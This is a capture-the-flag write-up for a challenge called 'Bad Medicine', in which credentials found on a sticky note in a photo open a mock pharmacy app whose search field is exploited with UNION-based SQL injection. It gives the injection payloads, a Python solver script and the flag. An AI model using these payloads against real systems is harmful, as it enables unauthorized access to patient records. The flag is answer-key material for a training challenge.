# Bad Medicine — CTF Challenge Writeup

## Challenge Information
- **Name:** Bad Medicine
- **Points:** 10
- **Author:** Veryyes
- **Description:** `A healthcare system, so it's HIPAA compliant right? RIGHT?`
- **Mirrors:**
  - `https://18.215.143.250:5000`
  - `https://18.145.136.91:5000`
- **Provided Files:** `office-photo.jpg`, `description.txt`
- **Flag:** `rstcon{p@ss_teh_hydrocod0n3_brah}`

---

## 1. Initial Reconnaissance & OSINT

The challenge provides a high-resolution image (`office-photo.jpg`) of a pharmacist's workspace.

Examining details in the photograph:
1. **Laptop Screen:**
   - Shows a web application titled **MedVault** (`Rx Inventory`).
   - The user logged in in the top right is `skim`.
   - The environment line shows: `pharmacy // site-3 • v2.1.0`.
2. **Sticky Note on the External Hard Drive (Pink Note):**
   - Directly notes down credentials:
     - Username: `skim`
     - Password: `PharmD#2026!`

---

## 2. Web Application Analysis

Navigating to the MedVault portal running on the provided mirror (`https://18.215.143.250:5000`):
- Login endpoint: `POST /login`
- Submitting `username=skim` and `password=PharmD#2026!` successfully authenticates and redirects to `/` with a session cookie.
- Once authenticated, the dashboard provides a search bar querying prescription medications:
  ```http
  GET /?q=amoxicillin HTTP/1.1
  ```

---

## 3. Vulnerability: SQL Injection (SQLi)

Testing the search query parameter `q` with basic SQL injection probes:
- Querying `' OR 1=1 -- -` returns all rows in the inventory table instead of just matched medications.
- The backend database is **SQLite**.
- The search result table renders 5 columns:
  `ID | MEDICATION | NDC | CATEGORY | QTY`

### Determining Schema via `UNION SELECT`:
Injecting:
```sql
' UNION SELECT 1, tbl_name, sql, 4, 5 FROM sqlite_master WHERE type='table' -- -
```
reveals the database structure:
- `users (id, username, password_hash, full_name, role, email)`
- `inventory (id, name, ndc, category, quantity, price)`
- `prescriptions (id, patient_id, inventory_id, prescriber, dosage, ...)`
- `insurance_claims (...)`
- `patients (id, first_name, last_name, date_of_birth, phone, email, address, allergies, created_at)`

---

## 4. Exploitation & Flag Extraction

Querying across the tables for flag patterns (`%rstcon%`):
```sql
' UNION SELECT id, first_name || ' ' || last_name, phone, address, date_of_birth FROM patients WHERE phone LIKE '%rstcon%' -- -
```

Returned record (Patient ID 42: Theresa Fernandez):
- **Patient Name:** `Theresa Fernandez`
- **Phone:** `rstcon{p@ss_teh_hydrocod0n3_brah}`
- **Allergies:** `Morphine`

---

## 5. Solver Script (`solve.py`)

```python
import requests
import urllib3
import re
import html

urllib3.disable_warnings()

TARGET = "https://18.215.143.250:5000"
session = requests.Session()

# Step 1: Login using credentials found on the sticky note
login_resp = session.post(
    f"{TARGET}/login",
    data={"username": "skim", "password": "PharmD#2026!"},
    verify=False
)

# Step 2: Extract flag via UNION SQL Injection in ?q=
payload = "' UNION SELECT id, first_name || ' ' || last_name, phone, address, date_of_birth FROM patients WHERE phone LIKE '%rstcon%' -- -"
resp = session.get(f"{TARGET}/", params={"q": payload}, verify=False)

# Step 3: Parse result
rows = re.findall(r"<tr[^>]*>(.*?)</tr>", resp.text, re.DOTALL)
for row in rows:
    cells = [html.unescape(re.sub(r"<[^>]+>", "", c).strip()) for c in re.findall(r"<td[^>]*>(.*?)</td>", row, re.DOTALL)]
    if cells and any("rstcon{" in cell for cell in cells):
        for cell in cells:
            if "rstcon{" in cell:
                print(f"[+] Flag found: {cell}")
```

### Output:
```text
[+] Flag found: rstcon{p@ss_teh_hydrocod0n3_brah}
```
